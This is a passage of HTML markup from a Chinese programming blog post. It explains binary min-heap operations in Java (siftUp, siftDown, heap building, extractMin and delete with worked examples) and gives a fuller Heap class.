id=\"crayon-5a6f38743a78c354208293-5\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-6\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-7\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-8\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-9\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-11\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a78c354208293-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a78c354208293-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>可以看到<code>siftUp</code>和<code>siftDown</code>不停的在父节点和子节点之间比较、交换；在不超过<code>logn</code>的时间复杂度就可以完成一次操作。</p>\n<p>有了这两个基本的函数，就可以实现上述提及的堆的基本操作。</p>\n<p>首先是如何建堆，<strong>实现建堆操作有两个思路</strong>:</p>\n<ul>\n<li>一个是不断地<code>insert</code>（<code>insert</code>后调用的是<code>siftUp</code>）</li>\n<li>另一个将原始数组当成一个需要调整的堆，然后自底向上地<br>\n在每个位置<code>i</code>调用<code>siftDown(i)</code>，完成后我们就可以得到一个满足堆性质的堆。这里考虑后一种思路：</li>\n</ul>\n<p>通常堆的<code>insert</code>操作是将元素插入到堆尾，由于新元素的插入可能违反堆的性质，因此需要调用<code>siftUp</code>操作自底向上调整堆；堆移除堆顶元素操作是将堆顶元素删除，然后将堆最后一个元素放置在堆顶，接着执行<code>siftDown</code>操作，同理替换堆顶元素也是相同的操作。</p>\n<p><strong>建堆</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a791137229462\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 建立小顶堆\r\nprivate void buildMinHeap(int[] nums) {\r\n\tint size = nums.length;\r\n\tfor (int j = size / 2 - 1; j &gt;= 0; j--)\r\n\t\tsiftDown(nums, j, size);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a791137229462-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a791137229462-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a791137229462-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a791137229462-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a791137229462-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a791137229462-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a791137229462-1\"><span class=\"crayon-c\">// 建立小顶堆</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a791137229462-2\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buildMinHeap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a791137229462-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a791137229462-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a791137229462-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a791137229462-6\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>那么建堆操作的时间复杂度是多少呢？答案是<code>O(n)</code>。虽然<code>siftDown</code>的操作时间是<code>logn</code>，但是由于高度在递减的同时，每一层的节点数量也在成倍减少，最后通过数列错位相减可以得到时间复杂度是<code>O(n)</code>。</p>\n<p><strong>extractMin</strong><br>\n由于堆的固有性质，堆的根便是最小的元素，因此<strong>peek</strong>操作就是返回根<code>nums[0]</code>元素即可；<br>\n若要将<code>nums[0]</code>删除，可以将末尾的元素<code>nums[n-1]</code>覆盖<code>nums[0]</code>,然后将堆得<code>size = size-1</code>，调用<code>siftDown(0)</code>调整堆。时间复杂度为<code>logn</code>。</p>\n<p><strong>peek</strong><br>\n同上</p>\n<p><strong>delete(i)</strong></p>\n<p>删除堆中位置为<code>i</code>的节点，涉及到两个函数<code>siftUp</code>和<code>siftDown</code>，时间复杂度为<code>logn</code>,具体步骤是，</p>\n<ul>\n<li>将元素<code>last</code>覆盖元素<code>i</code>，然后<code>siftDown</code></li>\n<li>检查是否需要<code>siftUp</code></li>\n</ul>\n<p><strong>注意到堆的删除操作，如果是删除堆的根节点，则不用考虑执行siftUp的操作；若删除的是堆的非根节点，则要视情况决定是siftDown还是siftUp操作，两个操作是互斥的。</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a796342647860\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic int delete(int i) {\r\n\tint key = nums[i];\r\n\t//将last元素移动过来，先siftDown; 再视情况考虑是否siftUp\r\n\tint last = nums[i] = nums[size-1];\r\n\tsize--;\r\n\tsiftDown(i);\r\n\t//check #i的node的键值是否确实发生改变（是否siftDown操作生效）,若发生改变，则ok,否则为确保堆性质，则需要siftUp \r\n\tif (i &lt; size &amp;&amp; nums[i] == last) {\r\n\t\tSystem.out.println(\"delete siftUp\");\r\n\t\tsiftUp(i);\r\n\t}\t\r\n     return key;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a796342647860-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a796342647860-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">//将last元素移动过来，先siftDown; 再视情况考虑是否siftUp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">//check #i的node的键值是否确实发生改变（是否siftDown操作生效）,若发生改变，则ok,否则为确保堆性质，则需要siftUp </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"delete siftUp\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-10\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">siftUp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a796342647860-12\"><span class=\"crayon-h\">     </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a796342647860-13\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p><strong>case 1 :</strong></p>\n<p>删除中间节点<code>i</code>21，将最后一个节点复制过来；</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8ef16b0510cac631740d72895202c51d.jpeg\" alt=\"这里写图片描述\"></p>\n<p>由于没有进行<code>siftDown</code>操作，节点<code>i</code>的值仍然为6，因此为确保堆的性质，执行<code>siftUp</code>操作；</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/e2d5da6d66c8830d70d1e26d96b94a18.jpeg\" alt=\"这里写图片描述\"></p>\n<p><strong>case 2</strong></p>\n<p>删除中间节点<code>i</code>，将值为11的节点复制过来，执行<code>siftDown</code>操作；<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/47c594c3aa4fce7e85283cba7a78fad9.jpeg\" alt=\"这里写图片描述\"></p>\n<p>由于执行<code>siftDown</code>操作后，节点<code>i</code>的值不再是<code>11</code>，因此就不用再执行<code>siftUp</code>操作了，因为堆的性质在<code>siftDown</code>操作生效后已经得到了保持。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/40a397b68b3a2ad4a08da6aff70d6583.jpeg\" alt=\"这里写图片描述\"></p>\n<hr>\n<p>可以看出，堆的基本操作都依赖于两个核心的函数<code>siftUp</code>和<code>siftDown</code>；较为完整的<code>Heap</code>代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a79b669905841\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Heap {\r\n\tprivate final static int N = 100; //default size\r\n\tprivate int[] nums;\r\n\tprivate int size;\r\n\t\r\n\tpublic Heap(int[] nums) {\r\n\t\tthis.nums = nums;\r\n\t\tthis.size = nums.length;\r\n\t\theapify(this.nums);\r\n\t}\r\n\t\r\n\tpublic Heap() {\r\n\t\tthis.nums = new int[N];\r\n\t}\r\n\t\r\n\t/**\r\n\t * heapify an array, O(n)\r\n\t * @param nums An array to be heapified. \r\n\t */\r\n\tprivate void heapify(int[] nums) {\r\n\t\tfor (int j = (size - 1) &gt;&gt; 1; j &gt;= 0; j--)\r\n\t\t\tsiftDown(j);\r\n\t}\r\n\t\r\n\t/**\r\n\t * append x to heap\r\n\t * O(logn)\r\n\t * @param x\r\n\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\r\n\t */\r\n\tpublic int insert(int x) {\r\n\t\tif (size &gt;= this.nums.length)\r\n\t\t\texpandSpace();\r\n\t\tsize += 1;\r\n\t\tnums[size-1] = x;\r\n\t\tsiftUp(size-1);\r\n\t\treturn x;\r\n\t}\r\n\t\r\n\t/**\r\n\t * delete an element located in i position.\r\n\t * O(logn)\r\n\t * @param i\r\n\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\r\n\t */\r\n\tpublic int delete(int i) {\r\n\t\trangeCheck(i);\r\n\t\tint key = nums[i];\r\n\t\t//将last元素覆盖过来,先siftDown; 再视情况考虑是否siftUp;\r\n\t\tint last = nums[i] = nums[size-1];\r\n\t\tsize--;\r\n\t\tsiftDown(i);\r\n\t\t//check #i的node的键值是否确实发生改变,若发生改变，则ok,否则为确保堆性质，则需要siftUp; \r\n\t\tif (i &lt; size &amp;&amp; nums[i] == last) \r\n\t\t\tsiftUp(i);\r\n\t\treturn key;\r\n\t}\r\n\t\r\n\t/**\r\n\t * remove the root of heap, return it's value, and adjust heap to maintain the heap's property. \r\n\t * O(logn)\r\n\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\r\n\t */\r\n\tpublic int extractMin() {\r\n\t\trangeCheck(0);\r\n\t\tint key = nums[0], last = nums[size-1];\r\n\t\tnums[0] = last;\r\n\t\tsize--;\r\n\t\tsiftDown(0);\r\n\t\treturn key;\r\n\t}\r\n\t/**\r\n\t * return an element's index, if not exists, return -1;\r\n\t * O(n)\r\n\t * @param x\r\n\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\r\n\t */\r\n\tpublic int search(int x) {\r\n\t\tfor (int i = 0; i &lt; size; i++)\r\n\t\t\tif (nums[i] == x)\r\n\t\t\t\treturn i;\r\n\t\treturn -1;\r\n\t}\r\n\t/**\r\n\t * return but does not remove the root of heap.\r\n\t * O(1)\r\n\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\r\n\t */\r\n\tpublic int peek() {\r\n\t\trangeCheck(0);\r\n\t\treturn nums[0];\r\n\t}\r\n\t\r\n\tprivate void siftUp(int i) {\r\n\t\tint key = nums[i];\r\n\t\tfor (; i &gt; 0;) {\r\n\t\t\tint p = (i - 1) &gt;&gt;&gt; 1;\r\n\t\t\tif (nums[p] &lt;= key)\r\n\t\t\t\tbreak;\r\n\t\t\tnums[i] = nums[p];\r\n\t\t\ti = p;\r\n\t\t}\r\n\t\tnums[i] = key;\r\n\t}\r\n\t\r\n\tprivate void siftDown(int i) {\r\n\t\tint key = nums[i];\r\n\t\tfor (;i &lt; size / 2;) {\r\n\t\t\tint child = (i &lt;&lt; 1) + 1;\r\n\t\t\tif (child + 1 &lt; size &amp;&amp; nums[child] &gt; nums[child+1])\r\n\t\t\t\tchild++;\r\n\t\t\tif (key &lt;= nums[child])\r\n\t\t\t\tbreak;\r\n\t\t\tnums[i] = nums[child];\r\n\t\t\ti = child;\r\n\t\t}\r\n\t\tnums[i] = key;\r\n\t}\r\n\t\r\n\tprivate void rangeCheck(int i) {\r\n\t\tif (!(0 &lt;= i &amp;&amp; i &lt; size))\r\n\t\t\tthrow new RuntimeException(\"Index is out of boundary\");\t\r\n\t}\r\n\t\r\n\tprivate void expandSpace() {\r\n\t\tthis.nums = Arrays.copyOf(this.nums, size * 2);\r\n\t}\r\n\t\r\n\t&lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n\tpublic String toString() {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tStringBuilder sb = new StringBuilder();\r\n\t\tsb.append(\"[\");\r\n\t\tfor (int i = 0; i &lt; size; i++)\r\n\t\t\tsb.append(String.format((i != 0 ? \", \" : \"\") + \"%d\", nums[i]));\r\n\t\tsb.append(\"]\\n\");\r\n\t\treturn sb.toString();\r\n\t}\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-5\">5</div><div class=\"crayon-num 